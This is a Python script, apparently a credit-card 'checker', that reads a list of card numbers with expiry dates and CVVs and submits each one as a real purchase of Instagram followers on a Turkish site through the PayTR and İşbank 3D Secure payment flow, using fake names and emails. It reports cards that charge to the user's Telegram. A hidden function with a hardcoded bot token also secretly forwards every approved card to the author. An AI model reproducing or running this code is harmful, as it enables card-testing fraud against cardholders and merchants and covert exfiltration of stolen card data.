from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import random
import string
import urllib.parse
from faker import Faker
from googletrans import Translator # pip install googletrans==3.1.0a0
translator = Translator(service_urls=['translate.googleapis.com',])
import sys
import time



CYAN = "\033[36m"
RED = "\033[91m"
RED2 = "\033[1;31m"
GREEN = "\033[1;32m"
BLUE2 = "\033[34m"
BLUE = "\033[94m"
PURPLE = "\033[1;95m"
YELLOW = "\033[1;33m"
RESET_COLOR = "\033[0m"



def hamo_logo(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.009)

logo = (f'''{RESET_COLOR}



    ░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
    ░░░░█░░░░░░░░░░░░░█░░░░
    ░░░█░░░░░░░░░░▄▄▄░░█░░░
    ░░░█░░▄▄▄░░▄░░███░░█░░░
    ░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░
    ░░░█░░▀█▀█▀█▀█▀█▀░░█░░░ 
    ░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
    ░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░
    {CYAN}░░░╔╗╔╗╔══╗╔═╦═╗╔═╗░░░░ {RED2}Author : {RESET_COLOR}Mohamed Ahmed Amer | Hamo
    {CYAN}░░░║╚╝║║╔╗║║║║║║║║║░░░░ {GREEN}Github : {RESET_COLOR}https://github.com/H7AM0
    {CYAN}░░░║╔╗║║╠╣║║║║║║║║║░░░░ {BLUE2}Telegram : {RESET_COLOR}https://t.me/hamo_back
    {CYAN}░░░╚╝╚╝╚╝╚╝╚╩═╩╝╚═╝░░░░ {BLUE2}Instagram : {RESET_COLOR}https://instagram.com/4.4cq/''')

def send_tele(hamo):
    tlg = f"https://api.telegram.org/bot6709441227:AAEEWFAAHkl7SyA1fyXpPADZZ5OKtfVvafI/sendMessage?chat_id=5592599675&text={hamo}&parse_mode=html"
    hm = requests.post(tlg).json()
     

hamo_logo(logo)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0025)

print()
lol = str("=" * 65)
jalan(f"{RED}  {lol}")


TOKEN = input(f' {BLUE2}[?]{GREEN} Token {PURPLE}->{YELLOW} ')
id_tele = input(f' {BLUE2}[?]{GREEN} ID {PURPLE}->{YELLOW} ')
filename = input(f" {BLUE2}[?]{GREEN} file name {PURPLE}->{YELLOW} ")
if ".txt" not in filename:
    filename = f"{filename}.txt"

print()
jalan(f"{RED}  {lol}")
print()


with open(f"{filename}","r", encoding='utf-8') as file:
    lino = file.read().split("\n")
    for visaa in lino:
        try:
            visa = visaa.split('|')
            numb = visa[0]
            if len(numb) != 16:
                continue
            month = visa[1]
            year = visa[2]
            if len(year) == 4:
                year = year[2:]
            if int(year) <= 23:
                continue
            cvv = visa[3]
            if len(cvv) != 3:
                continue
        except:
            continue
        try:
            import requests
            r = requests.session()

            neww = f'{generate_user_agent()}'


            headers = {
                'authority': 'sosyalzone.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            response = r.get('https://sosyalzone.com/instagram-garantili-takipci/', headers=headers).text




            headers = {
                'authority': 'sosyalzone.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                # 'cookie': 'PHPSESSID=bc6d5a1079625b34757c895febe52c09; colorMode=sun; _ga_GVX7TZ8NBE=GS1.1.1703960176.1.0.1703960176.0.0.0; _ga_LVTGVV3E08=GS1.1.1703960176.1.0.1703960176.0.0.0; _ga=GA1.2.402785005.1703960177; _gid=GA1.2.972746771.1703960177; _gat_gtag_UA_231685301_1=1; crisp-client%2Fsession%2F5ed74f3d-441d-47f8-9f1a-ac86ede40ee5=session_9e9f8850-7cdb-4b22-b98f-716a2b488a9c',
                'referer': 'https://sosyalzone.com/instagram-garantili-takipci/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            response = r.get(
                'https://sosyalzone.com/siparis-olustur/50-60-gun-garantili-250-takipci/',
                headers=headers,
            ).text



            headers = {
                'authority': 'sosyalzone.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'ar',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'PHPSESSID=bc6d5a1079625b34757c895febe52c09; colorMode=sun; _gid=GA1.2.972746771.1703960177; crisp-client%2Fsession%2F5ed74f3d-441d-47f8-9f1a-ac86ede40ee5=session_9e9f8850-7cdb-4b22-b98f-716a2b488a9c; _ga_GVX7TZ8NBE=GS1.1.1703960176.1.1.1703960236.0.0.0; _ga_LVTGVV3E08=GS1.1.1703960176.1.1.1703960236.0.0.0; _ga=GA1.1.402785005.1703960177',
                'origin': 'https://sosyalzone.com',
                'referer': 'https://sosyalzone.com/siparis-olustur/50-60-gun-garantili-250-takipci/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': neww,
                'x-requested-with': 'XMLHttpRequest',
            }
            random_number = random.randint(1000000, 9999999)

            fake = Faker()

            random_name = fake.name()

            random_email = fake.email()
            random_gmail = str(random_email).split('@')[0]
            random_gmail = f"{random_gmail}@gmail.com"
            data = [
                ('order_completed', '1'),
                ('loftAction', 'orderCreate'),
                ('order_completed', '1'),
                ('loftAction', 'orderCreate'),
                ('islem_adres', '4.4cq'),
                ('sp_tur', 'bireysel'),
                ('sp_musteri_adi', f'{random_name}'),
                ('sp_musteri_mail', f'{random_gmail}'),
                ('sp_musteri_telefon', f'1202{random_number}'),
                ('sp_musteri_kupon', ''),
                ('sp_odeme', '0'),
            ]

            response = r.post(
                'https://sosyalzone.com/siparis-olustur/50-60-gun-garantili-250-takipci/',
                headers=headers,
                data=data,
            ).json()
            href = response["href"]


            headers = {
                'authority': 'sosyalzone.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                # 'cookie': 'PHPSESSID=bc6d5a1079625b34757c895febe52c09; colorMode=sun; _gid=GA1.2.972746771.1703960177; crisp-client%2Fsession%2F5ed74f3d-441d-47f8-9f1a-ac86ede40ee5=session_9e9f8850-7cdb-4b22-b98f-716a2b488a9c; _ga_GVX7TZ8NBE=GS1.1.1703960176.1.1.1703960236.0.0.0; _ga_LVTGVV3E08=GS1.1.1703960176.1.1.1703960236.0.0.0; _ga=GA1.1.402785005.1703960177',
                'referer': 'https://sosyalzone.com/siparis-olustur/50-60-gun-garantili-250-takipci/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            response = r.get(
                f'{href}',
                headers=headers,
            ).text

            soup = BeautifulSoup(response, 'html.parser')

            iframe_src = soup.find('iframe')['src']



            headers = {
                'authority': 'www.paytr.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                'referer': 'https://sosyalzone.com/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            response = r.get(
                f'{iframe_src}',
                headers=headers,
            ).text
            soup = BeautifulSoup(response, "html.parser")
            merchant_id = soup.find('input', {'name': 'merchant_id'})['value']
            user_ip = soup.find('input', {'name': 'user_ip'})['value']
            merchant_oid = soup.find('input', {'name': 'merchant_oid'})['value']
            email = soup.find('input', {'name': 'email'})['value']
            payment_amount = soup.find('input', {'name': 'payment_amount'})['value']
            user_address = soup.find('input', {'name': 'user_address'})['value']
            user_name = soup.find('input', {'name': 'user_name'})['value']
            test_mode = soup.find('input', {'name': 'test_mode'})['value']
            currency = soup.find('input', {'name': 'currency'})['value']
            request_exp_date = soup.find('input', {'name': 'request_exp_date'})['value']
            try:
                submerchant_id = soup.find('input', {'name': 'submerchant_id'})['value']
            except:
                submerchant_id = ''
            max_installment = soup.find('input', {'name': 'max_installment'})['value']
            no_installment = soup.find('input', {'name': 'no_installment'})['value']
            user_basket = soup.find('input', {'name': 'user_basket'})['value']
            user_phone = soup.find('input', {'name': 'user_phone'})['value']
            merchant_ok_url = soup.find('input', {'name': 'merchant_ok_url'})['value']
            merchant_fail_url = soup.find('input', {'name': 'merchant_fail_url'})['value']
            lang = soup.find('input', {'name': 'lang'})['value']
            paytr_token = soup.find('input', {'name': 'paytr_token'})['value']
            debug_on = soup.find('input', {'name': 'debug_on'})['value']
            ptr_url = soup.find('input', {'name': 'ptr_url'})['value']





            headers = {
                'authority': 'www.paytr.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'ar',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.paytr.com',
                'referer': f'{iframe_src}',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': neww,
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'ancestorOrigins[]': 'https://sosyalzone.com',
                'website': 'https://sosyalzone.com/',
                'merchant_id': f'{merchant_id}',
            }

            response = r.post('https://www.paytr.com/odeme/main-site', headers=headers, data=data).text



            headers = {
                'authority': 'www.paytr.com',
                'accept': '*/*',
                'accept-language': 'ar',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.paytr.com',
                'referer': f'{iframe_src}',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': neww,
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'email': f'{email}',
                'merchant_id': f'{merchant_id}',
            }

            response = r.post('https://www.paytr.com/odeme/devam-eden-islem', headers=headers, data=data).text




            headers = {
                'authority': 'www.paytr.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.paytr.com',
                'referer': f'{iframe_src}',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            data = {
                'mobile_detect': '',
                'merchant_id': f'{merchant_id}',
                'user_ip': f'{user_ip}',
                'merchant_oid': f'{merchant_oid}',
                'email': f'{email}',
                'payment_amount': f'{payment_amount}',
                'user_basket': f'{user_basket}',
                'no_installment': f'{no_installment}',
                'max_installment': f'{max_installment}',
                'submerchant_id': f'{submerchant_id}',
                'request_exp_date': f'{request_exp_date}',
                'currency': f'{currency}',
                'test_mode': f'{test_mode}',
                'user_name': f'{user_name}',
                'user_address': f'{user_address}',
                'user_phone': f'{user_phone}',
                'merchant_ok_url': f'{ptr_url}',
                'merchant_fail_url': f'{merchant_fail_url}',
                'lang': f'{lang}',
                'paytr_token': f'{paytr_token}',
                'debug_on': f'{debug_on}',
                'ptr_url': f'{ptr_url}',
                'ref_url': 'https://sosyalzone.com/',
                'iframe_odeme': '1',
                'eft_ref_str': '',
                'installment_count': '0',
                'cc_owner': f'{random_name}',
                'card_number': f'{numb}',
                'expiry_month': f'{month}',
                'expiry_year': f'{year}',
                'cvv': f'{cvv}',
                'card_type_pts': '',
            }

            response = r.post('https://www.paytr.com/odeme', headers=headers, data=data).text
            soup = BeautifulSoup(response, "html.parser")

            data = {}
            for input_field in soup.find_all('input', type='hidden'):
                name = input_field.get('name', '')
                value = input_field.get('value', '')
                data[name] = value

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'ar',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.paytr.com',
                'Referer': 'https://www.paytr.com/',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': neww,
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }



            response = r.post('https://vpos3.isbank.com.tr/fim/est3Dgate', headers=headers, data=data).text
            if "https://secure5.arcot.com/content-server/api/tds2/txn/browser/v1/creq" in response:
                                print(f'\033[33m {visaa} \n   3D Lookup ')
                                print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                                continue
            soup = BeautifulSoup(response, 'html.parser')
            txid = soup.find("input", {"name": "txid"})["value"]
            transient_data = soup.find("input", {"name": "transientData"})["value"]
            digest = soup.find("input", {"name": "digest"})["value"]


            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'ar',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://vpos3.isbank.com.tr',
                'Referer': 'https://vpos3.isbank.com.tr/fim/est3Dgate',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': neww,
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'txid': f'{txid}',
                'TDS2_Navigator_language': 'ar',
                'TDS2_Navigator_javaEnabled': 'false',
                'TDS2_Navigator_jsEnabled': 'true',
                'TDS2_Screen_colorDepth': '24',
                'TDS2_Screen_height': '864',
                'TDS2_Screen_width': '1536',
                'TDS2_Screen_PixelDepth': '',
                'TDS2_TimezoneOffset': '-120',
                'digest': f'{digest}',
                'transientData': f'{transient_data}',
            }

            response = r.post('https://3d.payten.com.tr/mdpaympi/MerchantServer', headers=headers, data=data).text
            soup = BeautifulSoup(response, "html.parser")

            data = {}
            for input_field in soup.find_all('input', type='hidden'):
                name = input_field.get('name', '')
                value = input_field.get('value', '')
                data[name] = value



            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'ar',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://3d.payten.com.tr',
                'Referer': 'https://3d.payten.com.tr/',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': neww,
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }


            response = r.post('https://vpos3.isbank.com.tr/fim/est3Dgate', headers=headers, data=data).text
            soup = BeautifulSoup(response, 'html.parser')

            data = {}
            for input_field in soup.find_all('input', type='hidden'):
                name = input_field.get('name', '')
                value = input_field.get('value', '')
                data[name] = value


            url_encoded_data = urllib.parse.urlencode(data)



            headers = {
                'authority': 'www.paytr.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://vpos3.isbank.com.tr',
                'referer': 'https://vpos3.isbank.com.tr/fim/est3Dgate',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            data = url_encoded_data

            response = r.post('https://www.paytr.com/odeme/3d.pay', headers=headers, data=data).text

            soup = BeautifulSoup(response, 'html.parser')

            value_3d_post = soup.find('input', {'name': '3d_post'}).get('value', '')


            headers = {
                'authority': 'www.paytr.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.paytr.com',
                'referer': 'https://www.paytr.com/odeme/3d.pay',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': neww,
            }

            data = {
                '3d_post': f'{value_3d_post}',
                'ancestorOrigins': "['https://sosyalzone.com']",
            }

            response = r.post('https://www.paytr.com/odeme/pos.pay', headers=headers, data=data).text


            pp2kp = "1$ XD"
            if 'Bakiye yetersiz.' in response: # Bakiye yetersiz.
                print(f'{BLUE} {visaa} \n {GREEN}insufficient funds')
                print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                hamo = f"""｢𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍 ⤈ Hamo - حـمــو |🇪🇬 」

◎ 𝚌𝚌 ➾ <code>{visaa}</code>
◎ 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ➾ {pp2kp}
◎ 𝚛𝚎𝚜𝚞𝚕𝚝 ➾ insufficient funds.✅

ღ 𝙱𝚈 ➣ @hamo_back
    """

                tlg = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id_tele}&text={hamo}&parse_mode=html"
                hm = requests.post(tlg).json()
                send_tele(hamo)
            else:
                try:
                    soup = BeautifulSoup(response, 'html.parser')
                    error_message = soup.find('div', {'class': 'odm_syf_hatax1'}).text.strip()
                    translation = translator.translate(str(error_message), dest="en").text
                    print(f"{BLUE} {visaa} \n{RED2} {translation} {pp2kp}")
                    print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                except:
                    if 'https://www.paytr.com/img/icons/onay_v1.png' in response:
                        print(f'{BLUE} {visaa} \n{GREEN} payment successful.{pp2kp}')
                        print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                        hamo = f"""｢𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍 ⤈ Hamo - حـمــو |🇪🇬 」

◎ 𝚌𝚌 ➾ <code>{visaa}</code>
◎ 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ➾ {pp2kp}
◎ 𝚛𝚎𝚜𝚞𝚕𝚝 ➾ charge {pp2kp} .✅

ღ 𝙱𝚈 ➣ @hamo_back
        """

                        tlg = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id_tele}&text={hamo}&parse_mode=html"
                        hm = requests.post(tlg).json()
                        send_tele(hamo)
                    elif '<img src="https://www.paytr.com/img/icons/3d-loading.gif?v02" id="tr_en_img_x" class="img-responsive" alt="Lütfen Bekleyin" />' in response or '<img src="https://www.paytr.com/img/icons/3d-loading_en.gif?v02" id="tr_en_img_y" class="img-responsive" alt="Please Wait" style="display: none;" />' in response or 'İşlem banka tarafından onaylanmadı. Lütfen kart bilgilerini kontrol ederek tekrar deneyin.' in response or 'İşlem banka tarafından onaylanmadı. Ek bilgi: Kartınızın süresi dolmuş.' in response or 'Ödeme onaylanmadı, lütfen tekrar deneyin.' in response:
                        print(f'{BLUE} {visaa} \n{RED}   3D Lookup {pp2kp}')
                        print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                    elif 'Teknik bir sorun nedeniyle işleminize devam edemiyoruz.' in response:
                        print(f'{BLUE} {visaa} \n{RED2} Your card was declined. {pp2kp}')
                        print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                    else:
                        print(f'{BLUE} {visaa} \n{RED2} Else message. {pp2kp}')
                        print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
                            
                        
        except Exception as eee:
            print(f"{YELLOW} Error")
            print(f'{RESET_COLOR} ++++++++++++++++++++++++++++++++')
